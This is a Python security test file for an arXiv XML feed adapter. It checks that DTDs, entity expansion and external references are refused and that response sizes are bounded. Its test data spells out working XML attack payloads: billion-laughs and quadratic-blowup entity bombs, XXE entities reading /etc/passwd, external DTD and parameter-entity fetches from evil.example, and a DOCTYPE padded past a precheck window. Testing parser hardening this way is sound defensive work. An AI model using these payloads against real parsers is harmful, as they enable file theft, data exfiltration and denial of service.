"""arXiv XML hardening: DTDs, entities and external references are refused, sizes bounded."""

from __future__ import annotations

import asyncio
from typing import Any

import pytest
from http_replay import make_fixture_document
from knowledge_adapters import arxiv, transport

from asca.application.knowledge.models import (
    CandidateRef,
    KnowledgeQuery,
    ProviderError,
    ProviderErrorKind,
    SearchResult,
)
from asca.infrastructure.knowledge.arxiv import ARXIV_API, fetch_params, search_params

pytestmark = pytest.mark.security

PROBE = KnowledgeQuery("optimal filtering", 5)
INVALID_XML = ProviderError(ProviderErrorKind.MALFORMED_RESPONSE, "invalid_xml")
TOO_LARGE = ProviderError(ProviderErrorKind.RESPONSE_TOO_LARGE, "too_large")
FEED_OPEN = '<feed xmlns="http://www.w3.org/2005/Atom">'
ENTRY = "<entry><id>http://arxiv.org/abs/2109.05124v2</id><title>{title}</title></entry>"


def run(coro: Any) -> Any:
    return asyncio.run(coro)


def doc(body: str, query: KnowledgeQuery = PROBE, params: Any = None) -> dict[str, object]:
    return make_fixture_document(
        provider="arxiv",
        scenario="hostile",
        url=ARXIV_API,
        params=params if params is not None else search_params(query),
        headers={"content-type": "application/atom+xml; charset=utf-8"},
        body_text=body,
    )


def search_outcome(body: str) -> tuple[Any, Any]:
    replay = transport(doc(body))
    outcome = run(arxiv(replay).search(PROBE))
    return outcome, replay


@pytest.mark.parametrize("name", ["hostile/arxiv_dtd_bomb.json", "hostile/arxiv_xxe.json"])
def test_committed_hostile_feeds_are_refused(name: str) -> None:
    replay = transport(name)
    outcome = run(arxiv(replay).search(PROBE))
    assert outcome == INVALID_XML
    assert len(replay.requests) == 1 and not replay.unexpected


HOSTILE_DOCUMENTS = {
    "billion-laughs": (
        '<?xml version="1.0"?><!DOCTYPE feed [<!ENTITY a "aaaaaaaaaa">'
        '<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>'
        f"{FEED_OPEN}{ENTRY.format(title='&b;')}</feed>"
    ),
    "xxe-file": (
        '<!DOCTYPE feed [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        f"{FEED_OPEN}{ENTRY.format(title='&xxe;')}</feed>"
    ),
    "xxe-http": (
        '<!DOCTYPE feed [<!ENTITY xxe SYSTEM "https://evil.example/leak">]>'
        f"{FEED_OPEN}{ENTRY.format(title='&xxe;')}</feed>"
    ),
    "external-dtd": (
        '<!DOCTYPE feed SYSTEM "https://evil.example/feed.dtd">'
        f"{FEED_OPEN}{ENTRY.format(title='x')}</feed>"
    ),
    "parameter-entity": (
        '<!DOCTYPE feed [<!ENTITY % remote SYSTEM "https://evil.example/p.dtd"> %remote;]>'
        f"{FEED_OPEN}{ENTRY.format(title='x')}</feed>"
    ),
    "quadratic-blowup": (
        f'<!DOCTYPE feed [<!ENTITY a "{"x" * 5000}">]>'
        f"{FEED_OPEN}{ENTRY.format(title='&a;' * 2000)}</feed>"
    ),
    "doctype-after-the-precheck-window": (
        f"<!--{' ' * 5000}-->"
        '<!DOCTYPE feed [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        f"{FEED_OPEN}{ENTRY.format(title='&xxe;')}</feed>"
    ),
    "undeclared-entity": f"{FEED_OPEN}{ENTRY.format(title='&undeclared;')}</feed>",
}


@pytest.mark.parametrize("body", HOSTILE_DOCUMENTS.values(), ids=HOSTILE_DOCUMENTS.keys())
def test_hostile_xml_is_invalid_without_any_additional_request(body: str) -> None:
    outcome, replay = search_outcome(body)
    assert outcome == INVALID_XML
    assert len(replay.requests) == 1 and not replay.unexpected
    assert "root:" not in repr(outcome)


def test_hostile_xml_is_refused_on_fetch_and_deep_health_too() -> None:
    body = HOSTILE_DOCUMENTS["xxe-file"]
    replay = transport(doc(body, params=fetch_params("2109.05124v2")))
    assert run(arxiv(replay).fetch(CandidateRef("arxiv", "2109.05124v2"))) == INVALID_XML
    health_replay = transport(doc(body, params=fetch_params("0912.2642")))
    health = run(arxiv(health_replay).health(deep=True))
    assert health.error == INVALID_XML


def test_at_most_25_entries_are_parsed() -> None:
    entries = "".join(
        f"<entry><id>http://arxiv.org/abs/2511.{99000 + n}v1</id><title>Entry {n}</title></entry>"
        for n in range(30)
    )
    query = KnowledgeQuery("optimal filtering", 25)
    replay = transport(doc(f"{FEED_OPEN}{entries}</feed>", query=query))
    outcome = run(arxiv(replay).search(query))
    assert isinstance(outcome, SearchResult)
    assert len(outcome.candidates) == 25
    assert outcome.candidates[-1].ref.native_id == "2511.99024v1"


def test_an_error_entry_after_25_entries_is_not_parsed() -> None:
    entries = "".join(
        f"<entry><id>http://arxiv.org/abs/2511.{99000 + n}v1</id><title>Entry {n}</title></entry>"
        for n in range(25)
    )
    error = "<entry><id>http://arxiv.org/api/errors#late</id><title>Error</title></entry>"
    query = KnowledgeQuery("optimal filtering", 25)
    replay = transport(doc(f"{FEED_OPEN}{entries}{error}</feed>", query=query))
    outcome = run(arxiv(replay).search(query))
    assert isinstance(outcome, SearchResult) and len(outcome.candidates) == 25


def test_an_oversize_search_feed_is_too_large() -> None:
    padding = "<!--" + "x" * 1_100_000 + "-->"
    outcome, _ = search_outcome(f"{FEED_OPEN}{padding}</feed>")
    assert outcome == TOO_LARGE


def test_an_oversize_fetch_feed_is_too_large() -> None:
    padding = "<!--" + "x" * 300_000 + "-->"
    replay = transport(doc(f"{FEED_OPEN}{padding}</feed>", params=fetch_params("2109.05124v2")))
    outcome = run(arxiv(replay).fetch(CandidateRef("arxiv", "2109.05124v2")))
    assert outcome == TOO_LARGE
